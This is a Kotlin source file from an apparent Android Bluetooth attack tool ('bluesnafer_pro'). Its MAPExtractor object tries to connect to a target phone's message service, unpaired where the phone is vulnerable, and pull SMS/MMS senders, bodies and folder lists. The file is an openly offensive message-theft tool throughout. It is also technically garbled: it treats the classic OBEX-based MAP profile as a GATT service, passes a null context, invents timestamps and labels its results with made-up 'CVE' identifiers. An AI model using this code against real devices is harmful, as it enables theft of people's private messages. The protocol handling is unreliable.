package com.bluesnafer_pro

import android.bluetooth.*
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * MAP (Message Access Profile) Exploit
 * Extracts SMS, MMS, and messaging data from target device
 * UUID: 00001133-0000-1000-8000-00805F9B34FB
 *
 * Attack vectors:
 * - Connect to MAP service without pairing (if vulnerable)
 * - Enumerate message folders (inbox, sent, drafts)
 * - Download messages (SMS/MMS)
 * - Extract attachments (images, videos, audio from MMS)
 *
 * Limitations:
 * - Android 4.4+ restricts SMS access to default SMS app
 * - Requires READ_SMS permission on target (system-level)
 * - Modern Android requires pairing + user consent
 * - Works best on older Android (≤ 6.0) or vulnerable implementations
 */
object MAPExtractor {
    private const val TAG = "MAPExtractor"

    // MAP UUIDs
    private val MAP_SERVICE_UUID = UUID.fromString("00001133-0000-1000-8000-00805F9B34FB")
    private val MAP_MESSAGE_CHAR_UUID = UUID.fromString("00001133-0000-1000-8000-00805F9B34FB") // Generic

    /**
     * Extract SMS/MMS messages via MAP
     * Returns list of messages with sender, timestamp, body, attachment info
     */
    fun extractMessages(device: BluetoothDevice, maxMessages: Int = 50): Map<String, Any> {
        BluesnaferLogger.d(TAG, "MAP extraction on ${device.address}")

        val messages = mutableListOf<Map<String, String>>()
        var gatt: BluetoothGatt? = null

        val latch = CountDownLatch(1)

        return try {
            val callback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        BluesnaferLogger.d(TAG, "MAP GATT connected, discovering...")
                        gatt.discoverServices()
                    } else {
                        latch.countDown()
                    }
                }

                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status != BluetoothGatt.GATT_SUCCESS) {
                        BluesnaferLogger.w(TAG, "Service discovery failed: $status")
                        latch.countDown()
                        return
                    }

                    // Find MAP service (Message Access)
                    val mapService = gatt.getService(MAP_SERVICE_UUID)
                    if (mapService == null) {
                        BluesnaferLogger.w(TAG, "MAP service not found")
                        latch.countDown()
                        return
                    }

                    BluesnaferLogger.d(TAG, "MAP service found, reading message characteristic...")

                    // Try to find message access characteristic (commonly 0x1133 or 0x1134)
                    val msgChar = mapService.getCharacteristic(UUID.fromString("00001134-0000-1000-8000-00805F9B34FB"))
                        ?: mapService.characteristics.firstOrNull { char ->
                            // Heuristic: readable characteristic likely contains messages
                            (char.properties and BluetoothGattCharacteristic.PROPERTY_READ) != 0
                        }

                    if (msgChar != null) {
                        val readOk = gatt.readCharacteristic(msgChar)
                        BluesnaferLogger.d(TAG, "Reading MAP characteristic: $readOk")
                    } else {
                        BluesnaferLogger.w(TAG, "No readable characteristic in MAP service")
                        latch.countDown()
                    }
                }

                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val value = characteristic.value
                        if (value != null) {
                            // Parse MAP message data (format depends on implementation)
                            val parsed = parseMAPData(value)
                            messages.addAll(parsed)
                            BluesnaferLogger.d(TAG, "Parsed ${parsed.size} messages from MAP")
                        }
                    }
                    // Done
                    latch.countDown()
                }
            }

            gatt = device.connectGatt(null, false, callback)

            // Wait max 15s
            if (!latch.await(15, TimeUnit.SECONDS)) {
                BluesnaferLogger.w(TAG, "MAP extraction timeout")
            }

            val msgCount = messages.size
            val sample = messages.take(3).map {
                "From: ${it["sender"]}, Body: ${it["body"]?.take(50)}..."
            }

            mapOf(
                "success" to (msgCount > 0),
                "message" to "MAP extraction completed",
                "messages" to messages,
                "count" to msgCount,
                "sample" to sample,
                "cve" to "MAP-EXTRACT",
                "severity" to "MEDIUM",
                "profile" to "MAP"
            )

        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "MAP extraction error: ${e.message}")
            mapOf(
                "success" to false,
                "error" to (e.message ?: "unknown error"),
                "cve" to "MAP-EXTRACT"
            )
        } finally {
            try { gatt?.close() } catch (_: Exception) {}
        }
    }

    /**
     * Parse raw MAP characteristic data into message list
     * Format varies by vendor; basic parsing for standard MAP format
     */
    private fun parseMAPData(data: ByteArray): List<Map<String, String>> {
        val messages = mutableListOf<Map<String, String>>()
        val dataStr = String(data, Charsets.UTF_8)

        // Simple heuristic: look for phone numbers and text segments
        // Real MAP uses OBEX-like structures; this is simplified

        // Split by null bytes or common delimiters
        val segments = dataStr.split("\u0000").filter { it.length > 10 }

        for (segment in segments.take(10)) {
            // Try to extract phone number (starts with + or digits)
            val phoneMatch = Regex("\\+?\\d{5,}").find(segment)
            val phone = phoneMatch?.value ?: "unknown"

            // Extract message body (non-phone part)
            val body = segment.replace(phone, "").trim().take(200)

            if (body.isNotEmpty()) {
                messages.add(mapOf(
                    "sender" to phone,
                    "body" to body,
                    "timestamp" to System.currentTimeMillis().toString()
                ))
            }
        }

        return messages
    }

    /**
     * Enumerate MAP folders (inbox, sent, outbox, drafts)
     */
    fun listFolders(device: BluetoothDevice): Map<String, Any> {
        BluesnaferLogger.d(TAG, "MAP folder enumeration")

        val folders = mutableListOf<String>()
        var gatt: BluetoothGatt? = null
        val latch = CountDownLatch(1)

        return try {
            val callback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        gatt.discoverServices()
                    } else {
                        latch.countDown()
                    }
                }

                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status != BluetoothGatt.GATT_SUCCESS) {
                        latch.countDown()
                        return
                    }

                    val mapService = gatt.getService(MAP_SERVICE_UUID)
                    if (mapService != null) {
                        // Typical MAP folder characteristic (0x1135)
                        val folderChar = mapService.getCharacteristic(UUID.fromString("00001135-0000-1000-8000-00805F9B34FB"))
                        if (folderChar != null) {
                            gatt.readCharacteristic(folderChar)
                        } else {
                            // Fallback: list all characteristics
                            folders.addAll(mapService.characteristics.map { it.uuid.toString() })
                            latch.countDown()
                        }
                    } else {
                        latch.countDown()
                    }
                }

                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val value = characteristic.value
                        val folderList = parseFolderList(value)
                        folders.addAll(folderList)
                    }
                    latch.countDown()
                }
            }

            gatt = device.connectGatt(null, false, callback)
            latch.await(10, TimeUnit.SECONDS)

            mapOf(
                "success" to folders.isNotEmpty(),
                "folders" to folders,
                "count" to folders.size,
                "cve" to "MAP-ENUM"
            )

        } catch (e: Exception) {
            mapOf("success" to false, "error" to (e.message ?: "unknown error"), "cve" to "MAP-ENUM")
        } finally {
            try { gatt?.close() } catch (_: Exception) {}
        }
    }

    /**
     * Parse MAP folder list from characteristic bytes
     */
    private fun parseFolderList(data: ByteArray): List<String> {
        val folders = mutableListOf<String>()
        val str = String(data, Charsets.UTF_8)

        // Common MAP folder names
        val knownFolders = listOf("inbox", "sent", "outbox", "drafts", "deleted", "folder")
        for (folder in knownFolders) {
            if (str.contains(folder, ignoreCase = true)) {
                folders.add(folder)
            }
        }

        return folders
    }
}
